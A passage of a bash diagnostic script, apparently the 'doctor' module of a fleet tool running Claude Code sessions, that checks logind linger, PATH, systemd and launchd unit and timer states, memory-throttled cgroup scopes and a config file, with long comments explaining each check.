      "for an always-on box: stay logged in, and turn off sleep (System Settings > Lock Screen, and 'Prevent automatic sleeping' in Energy/Battery)"
    return 2
  fi
  if ! command -v loginctl >/dev/null 2>&1; then
    _dr_fail linger "loginctl is not on PATH — this box has no logind, but every ccd session is a systemd --user unit" \
      "install/enable systemd-logind, or do not run a fleet on this box"
    return 1
  fi
  local out rc
  out="$(loginctl show-user "$UID" --property=Linger 2>/dev/null)"; rc=$?
  if [ "$rc" -ne 0 ]; then
    # The measured shape of a box that never had it: logind knows nothing about
    # a user with neither a live session nor linger, so "not enabled" arrives
    # as an error rather than as `Linger=no`. Same verdict, different detail —
    # collapsing the two would hide which one an operator is looking at.
    _dr_fail linger "logind does not know uid $UID (loginctl show-user exited $rc) — a user with neither a live session nor linger answers exactly this way" \
      "run: sudo loginctl enable-linger $UID"
    return 1
  fi
  case "${out#Linger=}" in
    yes)
      _dr_pass linger "enabled for uid $UID — /run/user/$UID survives logout, so the session units keep running" ;;
    no)
      _dr_fail linger "not enabled for uid $UID — the fleet's systemd --user units die with the last login session" \
        "run: sudo loginctl enable-linger $UID"
      return 1 ;;
    *)
      _dr_fail linger "could not read Linger from loginctl (it printed \"$out\")" \
        "check by hand: loginctl show-user $UID --property=Linger"
      return 1 ;;
  esac
}

# ── $HOME/.local/bin on PATH ──────────────────────────────────────────────
# THE CHECK THAT MAKES EVERY OTHER REMEDY IN THIS FILE EXECUTABLE. `ccrc`, `ccd`,
# `ccd-cap-scopes` and every generated account wrapper are installed into
# `$HOME/.local/bin` (`deploy.sh`'s `install_atomic … .local/bin/…`, and
# `ccrc-adopt`/`ccrc wrappers` write there too), so a box whose login shell never
# put that directory on PATH answers "command not found" to every instruction
# this run just printed — and to `ccrc doctor` itself the next time.
#
# WARN AND NOT FAIL, deliberately: nothing about the box is broken, and a shell
# that DOES have the directory on PATH works perfectly. What is wrong is the
# environment the operator will type the next command into.
#
# THE POSITION IS PART OF THE MEASUREMENT (see "WHY THE DETAIL IS ALWAYS A
# MEASUREMENT" above): "it is on PATH" and "it is on PATH ahead of /usr/bin" are
# different facts, and only the second one means `claude` resolves to this box's
# wrapper rather than to whatever a distro package left in /usr/bin.
#
# THE DIRECTORY IS SPELLED HERE rather than taken from `ccrc-wrapper-shape`'s
# `WRAPPER_BIN_DIR`, and it is the one deliberate second spelling of it: that
# library is sourced BEST-EFFORT (see the top of this file), so a box missing it
# would get "the wrapper library did not ship" from a check whose subject is
# PATH — a diagnosis about the wrong thing, on exactly the box that can resolve
# nothing. The one-spelling rule keeps its mechanism instead of its promise:
# `ccrc-doctor.test.ts`'s "names the same directory the wrapper library does"
# compares the two literals and goes red on a drift.
_check_path() {
  local want="$HOME/.local/bin" p rest="${PATH:-}:" i=0
  while [ -n "$rest" ]; do
    p="${rest%%:*}"; rest="${rest#*:}"; i=$((i + 1))
    if [ "$p" = "$want" ]; then
      _dr_pass path "\$HOME/.local/bin is in \$PATH (position $i)"
      return 0
    fi
  done
  _dr_warn path "\$HOME/.local/bin is not in \$PATH — ccrc, ccd and every remedy this doctor prints resolve there" \
    "add 'export PATH=\"\$HOME/.local/bin:\$PATH\"' to ~/.profile (or ~/.bashrc), then log in again"
  return 2
}

# ── the units this box is supposed to be running ──────────────────────────
# A unit FILE with no process behind it is the failure spec §5 calls "services
# active", and no other check here can see it: the binaries are installed, the
# config is coherent, the roster agrees with the wrappers — and nothing answers
# on :7788.
#
# ── WHAT IS MEASURED IS WHAT WAS INSTALLED ───────────────────────────────
# Which units a box has IS its role (`_box_role`'s inference, D-73: nothing on a
# box records its role, and the unit files are the only evidence there is), so
# this asks about the units whose FILE is present and skips a box that has none
# rather than demanding units a dev checkout was never meant to have. A server
# box has `ccrc.service`, a fleet host has `ccrc-agent.service` and the
# cap-scopes timer, and `deploy.sh` puts each there (`_unit_atomic ~/ccrc/deploy/ccrc.service`, `_unit_atomic ~/ccrc/deploy/ccrc-agent.service`, `_unit_atomic ~/ccrc/deploy/systemd/ccd-cap-scopes.timer`).
#
# ── TWO CLASSES, BECAUSE THEY ARE TWO DIFFERENT MORNINGS ─────────────────
# A stopped `ccrc.service`/`ccrc-agent.service` is a FAIL: the box is configured
# to run it and it is not running, so the PWA answers nothing or the fleet link
# is down. A stopped `ccd-cap-scopes.timer` is a WARN: everything still works,
# and panes spawned meanwhile run without their memory cap (deploy.sh's OOM
# guardrail, added after a real outage). One remedy each, per this file's
# two-classes rule — joining them would hand the timer the server's instruction.
#
# `ccd-cap-scopes.service` IS DELIBERATELY NOT ASKED ABOUT. It is `Type=oneshot`
# (deploy/systemd/ccd-cap-scopes.service), so between runs a perfectly healthy
# box answers `inactive` for it — a check that asked would report every fleet
# host as broken. The TIMER is the thing that is supposed to be running, and it
# is the thing that is asked.
#
# THE DIRECTORY IS FILE-SCOPE because TWO checks read it: this one, and
# `_check_config`'s D-86 topology branch, which decides what an absent
# `ccrc.env` MEANS from the same unit files. One spelling, for the reason
# `ccrc-wrapper-shape` gives about `WRAPPER_BIN_DIR`: two checks comparing
# their own copies of a path is the same drift in miniature, and here it would
# be worse than a drift — the two would disagree about what role the box is.
# ONE SPELLING PER BOX, chosen the same way every other platform arm in this
# tree is. The comment above explains why this is one variable and not two
# copies; macOS keeps user agents in ~/Library/LaunchAgents, and adding the
# arm here rather than at the four read sites keeps that property.
if [ "${CCD_OS:-linux}" = darwin ]; then
  CCRC_UNIT_DIR="$HOME/Library/LaunchAgents"
else
  CCRC_UNIT_DIR="$HOME/.config/systemd/user"
fi

# THE FILE A UNIT IS ON DISK. systemd's unit name IS its filename; launchd's
# is a label plus `.plist`, and the translation already exists in `_svc_label`
# — which this file can call, because `ccrc` sources the platform block before
# it sources this one. Spelled once here so the checks below keep reading in
# systemd's vocabulary, which is the vocabulary their messages are written in.
_dr_unit_file() {   # <unit> -> the filename to look for under $CCRC_UNIT_DIR
  if [ "${CCD_OS:-linux}" = darwin ]; then printf '%s.plist' "$(_svc_label "$1")"; else printf '%s' "$1"; fi
}
# THE REMEDY VERB. Every "restart it" line in this file used to end in
# `systemctl --user restart ccrc.service`; on macOS that is a command not
# found, which turns a remedy into a second dead end.
# ONE DEFINITION, in the platform block `ccrc` sources before this file — this
# is the same question `_svc_restart_hint` answers, and two copies of a remedy
# string is how the two come to name different commands.
_dr_restart_hint() { _svc_restart_hint "$1"; }
# THE OTHER TWO REMEDY HALVES, same rule (PR #11 review: `_check_services`'
# FAIL handed a macOS operator three systemd commands, in the one check whose
# FAIL means "this box is configured to run it and it is not running").
# systemd's `enable --now` is launchd's `bootstrap` of the job file.
# `journalctl` has no macOS counterpart at all — but the generated server and
# agent plists write StandardOutPath to `~/.ccrc/logs/<label>.log`, so the log
# a remedy should point at EXISTS on disk; naming a file instead of a missing
# binary is the difference between a remedy and a second dead end. (`ccrc
# logs`' Darwin arm reads the same file, for the same reason.)
_dr_enable_now_hint() {   # <unit> -> the command that installs-and-starts it
  if [ "${CCD_OS:-linux}" = darwin ]; then
    printf 'launchctl bootstrap %s %s' "$(_svc_domain)" "$(_svc_plist "$1")"
  else
    printf 'systemctl --user enable --now %s' "$1"
  fi
}
_dr_log_hint() {   # <unit> -> the command that shows its recent log
  if [ "${CCD_OS:-linux}" = darwin ]; then
    printf 'tail -n 50 %s/.ccrc/logs/%s.log' "$HOME" "$(_svc_label "$1")"
  else
    printf 'journalctl --user -u %s -n 50' "$1"
  fi
}

# THIS FILE RUNS TWO DIFFERENT COVERAGE DESIGNS FOR TIMERS — "is a recurring
# job actually keeping its promise" — and this check is only one of them
# (D-2193). The units in the `known` array below are measured DIRECTLY, by
# asking systemd/launchd whether the unit is active; that array mixes actual
# TIMERS with this box's long-lived daemons, which are not recurring jobs at
# all and are simply polled for up/down like everything else in `known`. Two
# more timers are covered on purpose by a DIFFERENT design that measures the
# job's EFFECT instead of its activation state, and are deliberately absent
# from `known`: `_check_graphify`'s census sub-check covers
# `ccd-graph-sweep.timer` by reading the census artifact the timer PRODUCES
# (`~/.ccrc/graph-sweep.json`), and `_check_name` covers `ccrc-ddns.timer` by
# re-measuring the DNS record the timer maintains rather than the timer's own
# state. `ccd-usage-sweep.timer` is, measured, in NEITHER design — this file
# asks about it nowhere. `ccd-tmp-sweep.timer` is in `known`, the DIRECT
# design, because it writes no artifact an effect check could read: its only
# output is a journal line, and a stopped reaper is silent until the disk is. `ccd-scope-sweep.timer` is in `known` AND in the EFFECT design: `_check_scope-sweep` reads the verdict record its service rewrites every minute and warns when it is stale, but a reboot empties that record, so only `known` sees a timer that never ran again. The timer-fired oneshot `.service` siblings (one
# per timer) are out of THIS design BY CONSTRUCTION rather than by omission:
# a timer-fired oneshot is never `active` between runs, so polling one here
# would be a false positive. That does not leave them uncovered — the EFFECT
# design reaches a job through its OUTPUT, and the output is the service's,
# not the timer's, so `ccd-graph-sweep.service` and `ccrc-ddns.service` are
# exactly as covered as their timers: the service is what writes
# `~/.ccrc/graph-sweep.json` and what sets the DNS record those two read.
_check_services() {
  local dir="$CCRC_UNIT_DIR" u st why rc=0
  local -a ok=() installed=()
  # Not a glob over the directory: `claude-session@*.service` lives there too
  # (every ccd session is one, CLAUDE.md) and those are long-lived by design and
  # none of doctor's business.
  local -a known=(ccrc.service ccrc-agent.service ccd-cap-scopes.timer ccd-account-health.timer ccd-telemetry-keepalive.timer ccrc-models.timer ccrc-update-watchdog.timer ccd-pool-sync.timer ccd-update-sync.timer ccd-tmp-sweep.timer ccd-scope-sweep.timer ccd-history-sweep.timer)
  # ON DISK BY THE PLATFORM'S NAME, reported by systemd's. `_dr_unit_file` is
  # the one translation; keeping `installed` in unit vocabulary is what lets
  # every message below read the same on both platforms. ccd-cap-scopes has no
  # macOS counterpart at all (it caps cgroup scopes) and `_inst_units` does not
  # install one, so it is simply never found there — a skip, not a failure.
  for u in "${known[@]}"; do
    [ -f "$dir/$(_dr_unit_file "$u")" ] && installed+=("$u")
  done

  if [ "${#installed[@]}" -eq 0 ]; then
    # THE FOURTH OUTCOME, and the reason it is not a WARN: a checkout with no
    # install is the normal state of a developer's box, and there is nothing
    # here to fix. No remedy under a skip, by this file's own contract.
    _dr_skip services "no ccrc units installed in $dir — a dev checkout, or a box \`ccrc install\` never touched"
    return 3
  fi

  if ! _have_systemctl; then
    local _mgr=systemctl; [ "${CCD_OS:-linux}" = darwin ] && _mgr=launchctl
    _dr_fail services "$_mgr is not on PATH, but this box has job files in $dir (${installed[*]}) — so nothing could be asked whether they are running" \
      "install/enable this box's service manager — every ccd session is one of its jobs too (see the 'linger' check above); or remove the job files nothing on this box can start"
    return 1
  fi
  # Defaulted exactly as `ccrc`'s `_box_units` and `ccd:93-95` default them, and
  # for the same reason: without these two, `systemctl --user` cannot find the
  # bus from a non-interactive SSH context, every unit answers empty, and this
  # check reports a healthy box's units as stopped.
  # LINUX-ONLY BY CONSTRUCTION: launchctl needs no session bus, and exporting
  # a /run/user path on macOS would invent a directory for the benefit of
  # nothing.
  if [ "${CCD_OS:-linux}" != darwin ]; then
    : "${XDG_RUNTIME_DIR:=/run/user/$UID}"; export XDG_RUNTIME_DIR
    : "${DBUS_SESSION_BUS_ADDRESS:=unix:path=${XDG_RUNTIME_DIR}/bus}"; export DBUS_SESSION_BUS_ADDRESS
  fi

  for u in "${installed[@]}"; do
    # systemd's own word is quoted back (`failed`, `activating`, `inactive`),
    # because "failed" and "inactive" send an operator to two different places.
    # An EMPTY answer is a unit systemd would not talk about at all, which is
    # neither — hence `${st:-not active}` rather than a default of "inactive".
    st="$(_svc_is_active "$u")"
    if [ "$st" = active ]; then
      ok+=("$u is active")
      continue
    fi
    case "$u" in
      *.timer)
        # ONE CLASS, EACH WITH ITS OWN CONSEQUENCE. Every timer here DEGRADES
        # rather than downs the box, so every one warns — but the sentence an
        # operator reads has to name what THIS one stopping costs, or they get
        # the right remedy attached to somebody else's reason. `_dr_warn`'s
        # detail is the only place that fact exists, so it is a case rather
        # than one shared string.
        #
        # The `*` arm is not decoration: `known` above is the list this file
        # maintains, and a unit that joins it with no sentence of its own here
        # says something true and vague rather than something confidently
        # wrong about memory caps. `ccd-pool-sync.timer` (account-pool-
        # membership wave 1, Task 4) is the seventh unit this comment
        # anticipated — it got its own arm, below, rather than falling to `*`.
        case "$u" in
          ccd-cap-scopes.timer) why="panes spawned while it is stopped run without their memory cap" ;;
          ccd-account-health.timer) why="no account's credential is being probed, so a lane whose sign-in has died goes on looking healthy to placement" ;;
          ccd-telemetry-keepalive.timer) why="an idle account's ~/.cc-limits reading goes stale, so placement acts on a number nobody is refreshing" ;;
          # Sentence is claude-OpenClawHetzner's own — the session that reported this gap
          # (D-2190): "a dead timer means every lane's catalogue goes stale and nothing
          # says so."
          ccrc-models.timer) why="a dead timer means every lane's catalogue goes stale and nothing says so" ;;
          # account-pool-membership wave 1, Task 4: a stopped sync is SILENT —
          # unlike the four above, nothing about a stale-but-present cache
          # looks wrong until the lease expires, minutes later, and placement
          # starts refusing into every tagged project with no error anywhere.
          # That silence is the ruling (task-4-brief.md) for putting this
          # timer in `known` at all.
          ccd-pool-sync.timer) why="the node stops refreshing its pool projection, and nothing surfaces until the lease expires and placement starts refusing with no error anywhere" ;;
          # programme wave 4 (design 2026-09-20 §9): the update-intent puller,
          # silent on `ccd-pool-sync.timer`'s exact terms — the projection ages
          # in place until its lease ends, and only `ccrc update --to` still
          # works after that.
          ccd-update-sync.timer) why="the node stops refreshing its update projection, and every 'ccrc update' without --to refuses as stale once its lease ends" ;;
          # The temp-dir reaper: silent when stopped, loud only when `/` fills —
          # /tmp/claude-1000 reached 138G on the fleet host before it existed.
          ccd-tmp-sweep.timer) why="nothing reaps Claude Code's per-uid temp dir, which grows by gigabytes a day until / fills" ;;
          # ccrc history (spec 2026-10-05 §9.6): silent when stopped; the store's freshness is `_check_history`'s.
          ccd-history-sweep.timer) why="session text is not being captured into the history store, and a transcript Claude Code deletes before the next pass is lost for good" ;;
          ccd-scope-sweep.timer) why="no dead pane scope is recorded or collected, and the scope-sweep check has nothing fresh to read" ;;
          # W4a Task 9: the server box's update watchdog. Silent when stopped —
          # it acts only on the day a self-update dies mid-install, and on that
          # day nothing else is left on the box to measure the update.
          ccrc-update-watchdog.timer) why="a server self-update that dies mid-install is never measured or reverted — ccrc.service restart-loops a half-replaced tree into the start limit" ;;
          *) why="the job it fires is not running" ;;
        esac
        # Unreachable on macOS today (`_inst_units` installs none of these
        # timers' plists there) — routed through the hint anyway, so the day
        # that changes the remedy is already right.
        _dr_warn services "$u is installed but ${st:-not active} — $why" \
          "$(_dr_enable_now_hint "$u")"
        [ "$rc" -eq 1 ] || rc=2 ;;
      *)
        _dr_fail services "$u is installed but ${st:-not active} — this box is configured to run it and it is not running" \
          "$(_dr_enable_now_hint "$u"), then read what it says: $(_svc_status_hint "$u"), $(_dr_log_hint "$u")"
        rc=1 ;;
    esac
  done

  # The PASS names every unit it asked about, so a box that answers "PASS
  # services" cannot be a box where the check quietly measured one unit.
  if [ "$rc" -eq 0 ]; then
    _dr_pass services "$(_dr_join ${ok[@]+"${ok[@]}"})"
  fi
  return "$rc"
}

# ── the box's own config file ─────────────────────────────────────────────
# THE ONE CHECK WHOSE FAIL IS A REPRODUCTION. `CCRC_FLEET=remote` with either
# agent value missing makes the server print one line and exit 1 at boot
# (`server/src/index.ts:75-79`), which reaches an operator as a unit that will
# not come up and a journal they have to go and read. Measured here, it is a
# sentence naming the two keys.
#
# ── COHERENCE, NOT REACHABILITY ──────────────────────────────────────────
# This check reads the FILE and says whether it is one the server can boot on.
# Whether the agent at that URL answers, and whether the two boxes agree, is the
# `fleet` check's question and it has three answers of its own for it. Two
# checks measuring one thing is how they come to disagree.
#
# ── THE FILE IS NEVER SOURCED, AND NO VALUE IS EVER PRINTED ──────────────
# `~/.ccrc/ccrc.env` holds `CCRC_AGENT_TOKEN`, `CCRC_VAPID_PRIVATE` and a
# Hetzner token beside its addresses (`ccd/ccrc:355-380` states the rule and why
# the parse it uses is a deliberate SUBSET of systemd's `EnvironmentFile=`).
# Sourcing it would export all three into this process and every child it
# spawns. So the two credential keys are measured as SET or NOT SET, `CCRC_FLEET`
# is CLASSIFIED rather than quoted, and nothing off that file reaches a terminal
# an operator pastes into a ticket.
#
# D-85: the reader and the path both come from `ccrc` — `_box_env_value` and
# `BOX_ENV_FILE`, whose own comment (ccrc:91-101) names doctor as one of the
# three readers that must not re-spell the path. A private copy of either was
# the brief's suggestion and is refused for the reason this file's header gives
# about the wrapper shape: a second copy of a parser whose SUBSET property is
# the load-bearing part is how the two come to disagree about a file neither
# tool's consumer reads that way. Absence is reported the way `_check_fleet`
# reports the same absence — as a bug in ccrc, in a verdict line.
# ── scopes ────────────────────────────────────────────────────────────────
# IS A PANE SCOPE CURRENTLY STRANGLING ITS OWN SESSION?
#
# `ccd-cap-scopes` caps every tmux pane scope at MemoryHigh=8G/MemoryMax=12G,
# and it is right to: an uncapped scope once hit 24G and stalled the fleet for
# 25 minutes (that script's own header). But `MemoryHigh` THROTTLES rather than
# kills, so a scope living between high and max is put into reclaim and left
# there — `memory.events` reads `oom_kill 0`, no unit fails, nothing is logged.
# Measured 2026-08-27: one session sat 18h51m at 9.07 GiB against an 8 GiB high
# with the CLAUDE PROCESS ITSELF unschedulable, while `ccd ls` said `running`
# and the run board said `dispatched`. `_check_services` above asks whether the
# capper's timer is ACTIVE; nothing asked whether a cap was doing this.
#
# WHAT IT MEASURES, and why not the obvious thing. Being over `memory.high` is
# NOT the fault: the morning after that freeze the same suite crossed the same
# line, was reclaimed, and finished — that is the throttle working, and a check
# that fired on it would cry wolf on every healthy test run. The fault is a
# process PARKED in the reclaim path, so this reads `/proc/<pid>/wchan` for
# `mem_cgroup_handle_over_high` and requires the SAME pid to still be there one
# settle later. `D` is normally sub-millisecond; surviving two samples is
# already pathological, and that freeze held for eleven hours.
#
# WARN, NEVER FAIL, deliberately: `cmd_install` ends with `cmd_doctor` and
# returns its code (D-894), so a FAIL here would make `ccrc install` exit
# non-zero on a box whose only sin is a busy session. Doctor answers "is this
# box set up correctly"; a throttled scope is a runtime fact, and the fleet view
# is where runtime facts belong.
#
# The cgroup path is ASKED FOR, never built (`-p ControlGroup`). Building it is
# exactly what left `ccd-cap-scopes` capping nothing for 13 days, and what
# D-307 broke again when the tmux server moved slice.
_check_scopes() {
  if [ "${CCD_OS:-linux}" = darwin ]; then
    _dr_skip scopes "cgroup scopes are a Linux mechanism — this box has none to measure"
    return 3
  fi
  if ! _have_systemctl; then
    _dr_skip scopes "systemctl is not on PATH, so no pane scope can be located"
    return 3
  fi
  local cgroot="${CCRC_CGROUP_ROOT:-/sys/fs/cgroup}"
  local procroot="${CCRC_PROC_ROOT:-/proc}"
  local settle="${CCRC_SCOPE_SETTLE_SEC:-1}"

  local -a scopes=()
  local unit _rest
  # `read unit _rest`, not `awk '{print $1}'` — this file resolves no external
  # binary that is not the subject it is measuring (see `_check_disk`), and the
  # subject here is systemctl.
  while read -r unit _rest; do
    [ -n "$unit" ] && scopes+=("$unit")
  done < <(systemctl --user list-units --no-legend 'tmux-spawn-*.scope' 2>/dev/null)

  if [ "${#scopes[@]}" -eq 0 ]; then
    _dr_skip scopes "no tmux pane scopes on this box — nothing is running under a cap"
    return 3
  fi

  # FIRST SAMPLE for every scope. The cgroup path is ASKED FOR, never built:
  # building it is what left `ccd-cap-scopes` capping nothing for 13 days, and
  # what D-307 broke again when the tmux server changed slice.
  local sc cg
  local -A stuck1=() cgof=()
  for sc in "${scopes[@]}"; do
    cg="$(systemctl --user show "$sc" -p ControlGroup --value 2>/dev/null || true)"
    [ -n "$cg" ] || continue
    [ -d "$cgroot$cg" ] || continue      # died between listing and read — a race, not a fault
    cgof["$sc"]="$cg"
    stuck1["$sc"]="$(_dr_scope_stuck "$cgroot$cg" "$procroot")"
  done

  # Nothing parked anywhere: answer WITHOUT settling. A healthy box is the
  # common case and must not pay a second of doctor's runtime for a question
  # whose answer is already in.
  local sc_any=0
  for sc in "${!stuck1[@]}"; do [ -n "${stuck1[$sc]}" ] && sc_any=1; done
  if [ "$sc_any" -eq 0 ]; then
    _dr_pass scopes "${#scopes[@]} pane scope(s), none throttled"
    return 0
  fi

  # Something IS parked. The second sample is what separates a scheduling blip
  # from a scope in reclaim, so without a way to wait this check cannot finish
  # its own sentence — and says so rather than guessing in either direction.
  if ! command -v sleep >/dev/null 2>&1; then
    _dr_warn scopes "processes are parked in memory reclaim, and sleep is not on PATH, so the second sample that would tell a blip from a stall could not be taken"       "install coreutils, then re-run: this check needs to look twice before it will call a scope stalled"
    return 2
  fi
  sleep "$settle"

  local -a bad=()
  local first second p persist
  for sc in "${!cgof[@]}"; do
    first="${stuck1[$sc]}"
    [ -n "$first" ] || continue
    second="$(_dr_scope_stuck "$cgroot${cgof[$sc]}" "$procroot")"
    # The INTERSECTION, not either sample: a pid that has left the reclaim path
    # was a blip, and a pid that only just entered it has proved nothing yet.
    persist=0
    for p in $first; do
      case " $second " in *" $p "*) persist=$((persist+1));; esac
    done
    [ "$persist" -gt 0 ] && bad+=("$sc has $persist process(es) parked in memory reclaim at $(_dr_scope_mem "$cgroot${cgof[$sc]}")")
  done

  if [ "${#bad[@]}" -eq 0 ]; then
    _dr_pass scopes "${#scopes[@]} pane scope(s), none throttled"
    return 0
  fi
  local detail="" b
  for b in "${bad[@]}"; do detail="${detail}${detail:+; }${b}"; done
  _dr_warn scopes "$detail" \
    "that scope is over its MemoryHigh and the kernel is throttling every process in it, the session's own agent included — find the workload inside it (ps against the workspace path) and stop it; do NOT raise the cap, it is what keeps one pane from stalling the whole box"
  return 2
}

# The pids of `$1` (an absolute cgroup directory) currently parked in the
# memory-reclaim throttle, space separated. Silent about every read that fails:
# a pid can exit between `cgroup.procs` and `wchan`, and a scope can vanish
# entirely, neither of which is news.
_dr_scope_stuck() {
  local cgdir="$1" procroot="$2" pid w out=""
  [ -r "$cgdir/cgroup.procs" ] || { printf ''; return 0; }
  while IFS= read -r pid; do
    [ -n "$pid" ] || continue
    [ -r "$procroot/$pid/wchan" ] || continue
    # `|| :`, NOT `|| continue`. /proc/<pid>/wchan carries NO TRAILING NEWLINE,
    # so `read` returns 1 at EOF having nevertheless set `w` — and the first
    # version of this line read that non-zero as "unreadable" and skipped every
    # pid on the box. It hid because the healthy path answers PASS either way;
    # only a fixture with a genuinely parked pid could tell.
    w=""
    IFS= read -r w < "$procroot/$pid/wchan" 2>/dev/null || :
    [ "$w" = mem_cgroup_handle_over_high ] && out="${out}${out:+ }$pid"
  done < "$cgdir/cgroup.procs"
  printf '%s' "$out"
}

# "<current> of <high>" in GiB, for the WARN's detail. Read with `read`, not
# `cat`, and formatted with bash arithmetic, not `awk` — same rule as the
# listing above. An unreadable file answers "?" rather than 0: an unread number
# is not a measured one, and a 0.00 here would read as a scope using nothing.
_dr_scope_mem() {
  local cgdir="$1" cur="" high=""
  read -r cur < "$cgdir/memory.current" 2>/dev/null || cur=""
  read -r high < "$cgdir/memory.high" 2>/dev/null || high=""
  printf '%s of %s' "$(_dr_gib "$cur")" "$(_dr_gib "$high")"
}

# Integer bytes -> "N.NN GiB". Two fixed decimals via *100 then split, because
# bash has no floating point and this file has no awk.
_dr_gib() {
  case "$1" in
    ''|*[!0-9]*) printf '?' ;;
    *) local h=$(( $1 * 100 / 1073741824 )); printf '%d.%02d GiB' $(( h / 100 )) $(( h % 100 )) ;;
  esac
}

_check_config() {
  if [ -z "${BOX_ENV_FILE:-}" ] || ! declare -F _box_env_value >/dev/null 2>&1; then
    _dr_fail config "ccrc's own config reader is not loaded, so this box's ccrc.env was never read" \
      "this is a bug in ccrc, not a fact about your box — _check_config reads BOX_ENV_FILE through _box_env_value, both declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi

  if [ ! -e "$BOX_ENV_FILE" ]; then
    # ── D-86: WHAT AN ABSENT ccrc.env MEANS DEPENDS ON THE BOX ────────────
    # THE FLEET HOST HAS NO ccrc.env AND IS NOT MISSING ONE. It carries
    # `~/.ccrc/agent.env` (which configures the agent) and has no reason to know
    # where the server is — `_check_fleet` states exactly this, and SKIPS for it.
    # `ccrc` ships to that box too (deploy.sh's agent-arm rsync, `agent shared deploy ccd "$BOX":ccrc/`), so until this branch existed
    # every doctor run there printed "the server's defaults apply" about a server
    # that does not run there, and told the operator to run `ccrc install` — the
    # single-box SERVER-role installer. Wrong sentence and wrong instruction, on
    # the one box in the topology that has neither.
    #
    # The evidence is the UNIT FILES, which is the only thing on a box that
    # records its role at all (D-73, `_box_role`'s own reasoning) and exactly
    # what `_check_services` above already reads. Both halves are required:
    # "no ccrc.service" alone is also a dev checkout that has installed nothing,
    # and for that box the defaults sentence below is correct.
    if [ ! -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc.service)" ] && [ -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc-agent.service)" ]; then
      _dr_skip config "no $BOX_ENV_FILE, and this box's units are the fleet role's ($CCRC_UNIT_DIR has ccrc-agent.service and no ccrc.service) — the server's config file does not live here, so there is nothing to measure"
      return 3
    fi
    # NOT a FAIL: a box with no config file boots, in the mode the server's own
    # defaults pick (`server/src/config.ts`). It is worth saying out loud
    # because the defaults are a SINGLE-BOX localhost server, and an operator
    # who believes they configured a fleet host has just been told otherwise.
    _dr_warn config "no $BOX_ENV_FILE, so the server's defaults apply: local mode on 127.0.0.1:7788" \
      "run: ccrc install (it writes one), or copy deploy/ccrc.env.example to $BOX_ENV_FILE and edit it"
    return 2
  fi
  # "There is no file", "there is one and it is not a file" and "there is one
  # and I cannot read it" are three different things to do something about, and
  # without these two guards the second and third arrive as a file that declares
  # nothing — a confident PASS on a box nobody measured, with bash's own
  # diagnosis on stderr. `_box_server_addr` (ccrc:315-325) splits them the same
  # way, and for the same reason.
  if [ ! -f "$BOX_ENV_FILE" ]; then
    _dr_warn config "$BOX_ENV_FILE is not a regular file, so nothing could be read out of it" \
      "look at what is really there: ls -ld $BOX_ENV_FILE"
    return 2
  fi
  if [ ! -r "$BOX_ENV_FILE" ]; then
    _dr_warn config "$BOX_ENV_FILE cannot be read, so this box's mode was never measured" \
      "check its mode and owner: ls -l $BOX_ENV_FILE (the server reads it as the user the unit runs as)"
    return 2
  fi

  local mode url token
  mode="$(_box_env_value "$BOX_ENV_FILE" CCRC_FLEET)"
  url="$(_box_env_value "$BOX_ENV_FILE" CCRC_AGENT_URL)"
  token="$(_box_env_value "$BOX_ENV_FILE" CCRC_AGENT_TOKEN)"

  # `server/src/config.ts:154` reads anything that is not exactly `remote` as
  # local — absent included. A check stricter than the reader it describes would
  # report a box that boots perfectly well as misconfigured, which is the
  # one-directional-failure rule `_box_env_value`'s own header states.
  if [ "$mode" != remote ]; then
    local why="CCRC_FLEET is not set"
    [ -z "$mode" ] || why="CCRC_FLEET is set to something other than \"remote\""
    _dr_pass config "$BOX_ENV_FILE present, fleet mode local ($why, which server/src/config.ts reads as local)"
    return 0
  fi

  # BOTH halves of the server's own condition (`!cfg.agentUrl || !cfg.agentToken`),
  # and empty is absent to `config.ts:155-156` as it is here.
  local -a gaps=()
  [ -n "$url" ] || gaps+=("CCRC_AGENT_URL is empty or absent")
  [ -n "$token" ] || gaps+=("CCRC_AGENT_TOKEN is empty or absent")
  if [ "${#gaps[@]}" -gt 0 ]; then
    _dr_fail config "$BOX_ENV_FILE declares CCRC_FLEET=remote but $(_dr_join ${gaps[@]+"${gaps[@]}"}) — the server exits 1 at boot in exactly this state, before it listens on anything" \
      "set both CCRC_AGENT_URL and CCRC_AGENT_TOKEN in ~/.ccrc/ccrc.env, or set CCRC_FLEET=local"
    return 1
  fi
  _dr_pass config "$BOX_ENV_FILE present, fleet mode remote, and both CCRC_AGENT_URL and CCRC_AGENT_TOKEN are set (whether the agent ANSWERS is the 'fleet' check below)"
}

# ── the session gate: the flag, and the passphrase it needs ───────────────
# TWO FACTS, ONE VERDICT, because neither is worth anything without the other.
# `CCRC_AUTH=on` with no `~/.ccrc/auth.scrypt` is a box that answers 401 to
# every request and cannot be logged into at all (Task 5's fail-SHUT polarity);
# a passphrase with the flag off is a console anybody on the tailnet can drive.
# An operator acts on those two differently, so they get different classes —
# but they are one CHECK, because "is this box's gate in a working state" is
# one question and answering it out of two checks is how two checks come to
# disagree.
#
# ── WHERE THE CLASSES LAND, AND WHY (operator ruling, Task 9 review) ──────
#   flag off, no file      -> PASS. The shipped default of every box; the
#                             arming instructions ride the detail as
#                             next-steps text. A warning here ends every clean
#                             install yellow and teaches operators to skim.
#   flag off, usable file  -> PASS ("nothing is gated yet").
#   flag ON, no file       -> FAIL. Armed and failing shut: nobody can log in.
#   file present, unusable -> FAIL in BOTH flag positions. The difference is
#                             tense, not class (booting now / a boot refusal
#                             waiting to happen).
#   file present, no build -> WARN. Nothing measured it; that is neither a
#                             PASS nor a known fault.
#
# ── THE FLAG IS READ AS ccrc.service GETS IT, NEVER FROM THIS SHELL ───────
# The unit carries TWO `EnvironmentFile=` lines — `~/.ccrc/ccrc.env`, then
# $CCRC_EXPOSURE_FILE — and the LATER one wins by PRESENCE, even when its
# value is empty (wave 8 item D (decision D)): `ccrc expose` writes CCRC_AUTH=on
# into the exposure file and never into ccrc.env, so a check that read
# ccrc.env alone called every correctly exposed box unarmed. An exported
# `CCRC_AUTH` in the operator's own shell decides nothing at all, either way.
# Same reader `_check_update-exposure` and install's gate line now share:
# `ccrc`'s `_box_unit_env`, never a private copy. An exposure file that is
# THERE AND UNREADABLE cannot say what the service manager received — its
# verdict is UNMEASURED, not a guess at either answer (D-3596; `_box_unit_env`'s
# own header argues the same rc).
#
# ── THE FILE IS MEASURED BY THE SERVER'S OWN PARSER, THROUGH NODE ─────────
# `_check_wrappers` already reads a JSON file with `node -e` rather than
